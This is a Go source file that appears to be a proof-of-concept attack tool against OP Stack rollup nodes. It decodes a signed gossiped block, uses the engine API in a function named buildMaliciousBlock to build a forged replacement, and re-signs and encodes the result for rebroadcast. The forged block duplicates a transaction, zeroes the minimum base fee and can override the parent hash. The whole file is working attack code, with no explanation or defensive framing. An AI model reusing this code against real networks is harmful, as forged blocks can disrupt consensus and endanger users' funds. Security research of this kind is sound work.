package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/ethereum-optimism/optimism/op-service/client"
	"github.com/ethereum-optimism/optimism/op-service/eth"
	opsigner "github.com/ethereum-optimism/optimism/op-service/signer"
	"github.com/ethereum/go-ethereum/common"
	"github.com/golang-jwt/jwt/v5"
	"github.com/golang/snappy"
)

type Engine struct {
	client     client.RPC
	privateKey *ecdsa.PrivateKey
	chainId    eth.ChainID
}

type jwtTransport struct {
	secret []byte
}

const SIGNATURE_LENGTH = 65

func (t *jwtTransport) RoundTrip(req *http.Request) (*http.Response, error) {
	claims := jwt.MapClaims{"iat": time.Now().Unix()}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	signed, _ := token.SignedString(t.secret)
	req = req.Clone(req.Context())
	req.Header.Set("Authorization", "Bearer "+signed)
	return http.DefaultTransport.RoundTrip(req)
}

func (e *Engine) buildMaliciousBlock(envelope *eth.ExecutionPayloadEnvelope, parentOverride *common.Hash) (*eth.ExecutionPayloadEnvelope, error) {
	payload := envelope.ExecutionPayload

	if len(payload.Transactions) == 0 {
		return nil, fmt.Errorf("no transactions in payload")
	}

	eipParams := (*eth.Bytes8)([]byte{0x00, 0x00, 0x00, 0xfa, 0x00, 0x00, 0x00, 0x06})

	headBlockHash := payload.ParentHash
	if parentOverride != nil {
		headBlockHash = *parentOverride
	}
	minBaseFee := uint64(0)

	forkState := eth.ForkchoiceState{
		HeadBlockHash:      headBlockHash,
		SafeBlockHash:      common.Hash{},
		FinalizedBlockHash: common.Hash{},
	}
	payloadAttributes := eth.PayloadAttributes{
		Timestamp:             payload.Timestamp,
		PrevRandao:            payload.PrevRandao,
		SuggestedFeeRecipient: payload.FeeRecipient,
		Withdrawals:           payload.Withdrawals,
		ParentBeaconBlockRoot: envelope.ParentBeaconBlockRoot,
		Transactions:          []eth.Data{payload.Transactions[0], payload.Transactions[0]},
		NoTxPool:              true,
		GasLimit:              &payload.GasLimit,
		EIP1559Params:         eipParams,
		MinBaseFee:            &minBaseFee,
	}

	var fcuResult eth.ForkchoiceUpdatedResult
	if err := e.client.CallContext(context.Background(), &fcuResult, "engine_forkchoiceUpdatedV3", &forkState, &payloadAttributes); err != nil {
		return nil, fmt.Errorf("forkchoiceUpdated: %w", err)
	}
	log.Printf("forkchoiceUpdated payloadID=%s", fcuResult.PayloadID)

	time.Sleep(500 * time.Millisecond)

	var newEnvelope eth.ExecutionPayloadEnvelope
	if err := e.client.CallContext(context.Background(), &newEnvelope, "engine_getPayloadV4", fcuResult.PayloadID); err != nil {
		return nil, fmt.Errorf("getPayload: %w", err)
	}
	return &newEnvelope, nil
}

func (p *Engine) decodePayload(data []byte) (*eth.ExecutionPayload, error) {
	if len(data) < SIGNATURE_LENGTH {
		return nil, fmt.Errorf("message too short (%d bytes)", len(data))
	}
	payloadBytes := data[SIGNATURE_LENGTH:]
	var envelope eth.ExecutionPayloadEnvelope
	if err := envelope.UnmarshalSSZ(eth.BlockV4, uint32(len(payloadBytes)), bytes.NewReader(payloadBytes)); err != nil {
		return nil, fmt.Errorf("unmarshal envelope: %w", err)
	}
	return envelope.ExecutionPayload, nil
}

func (e *Engine) decodeEnvelope(data []byte) (*eth.ExecutionPayloadEnvelope, error) {
	if len(data) < SIGNATURE_LENGTH {
		return nil, fmt.Errorf("message too short (%d bytes)", len(data))
	}
	payloadBytes := data[SIGNATURE_LENGTH:]
	var envelope eth.ExecutionPayloadEnvelope
	if err := envelope.UnmarshalSSZ(eth.BlockV4, uint32(len(payloadBytes)), bytes.NewReader(payloadBytes)); err != nil {
		return nil, fmt.Errorf("unmarshal envelope: %w", err)
	}
	return &envelope, nil
}

func (e *Engine) signPayload(sszPayload []byte, privKey *ecdsa.PrivateKey) ([SIGNATURE_LENGTH]byte, error) {
	signer := opsigner.NewLocalSigner(privKey)
	payloadHash := opsigner.PayloadHash(sszPayload)
	sig, err := signer.SignBlockV1(context.Background(), e.chainId, payloadHash)
	return [SIGNATURE_LENGTH]byte(sig), err
}

func (e *Engine) encodeEnvelope(envelope *eth.ExecutionPayloadEnvelope) ([]byte, error) {
	var buf bytes.Buffer
	buf.Write(make([]byte, SIGNATURE_LENGTH))

	if _, err := envelope.MarshalSSZ(&buf); err != nil {
		return nil, fmt.Errorf("marshal envelope: %w", err)
	}
	data := buf.Bytes()

	sig, err := e.signPayload(data[SIGNATURE_LENGTH:], e.privateKey)
	if err != nil {
		return nil, fmt.Errorf("sign: %w", err)
	}
	copy(data[:SIGNATURE_LENGTH], sig[:])
	return snappy.Encode(nil, data), nil
}

func (e *Engine) modify(data []byte, parentOverride *common.Hash) ([]byte, error) {
	envelope, err := e.decodeEnvelope(data)
	if err != nil {
		return nil, fmt.Errorf("decode: %w", err)
	}

	newEnvelope, err := e.buildMaliciousBlock(envelope, parentOverride)
	if err != nil {
		return nil, fmt.Errorf("build block: %w", err)
	}
	log.Printf("built replacement block hash %s", newEnvelope.ExecutionPayload.BlockHash)

	return e.encodeEnvelope(newEnvelope)
}
